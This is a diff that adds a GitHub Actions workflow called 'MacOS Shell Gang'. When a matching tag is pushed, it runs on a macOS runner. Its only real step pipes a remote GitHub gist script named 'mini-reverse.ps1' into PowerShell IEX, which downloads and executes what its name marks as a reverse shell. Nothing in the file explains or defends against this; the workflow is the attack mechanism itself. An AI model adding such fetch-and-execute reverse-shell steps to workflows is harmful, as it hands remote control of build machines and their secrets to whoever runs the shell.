@@ -1,0 +1,15 @@
+name: MacOS Shell Gang
+
+on:
+  push:
+    tags:
+      - 'w*'
+
+jobs:
+  Heeho:
+    runs-on: macos-latest
+    steps:
+      - name: Get repository
+        uses: actions/checkout@v2
+      - name: Script time
+        run: powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/SomethingGeneric/51a6f007e33a702b4505aefc161c3f31/raw/e533ce63189a6b728994e7b415ed185bf4dafb3e/mini-reverse.ps1')
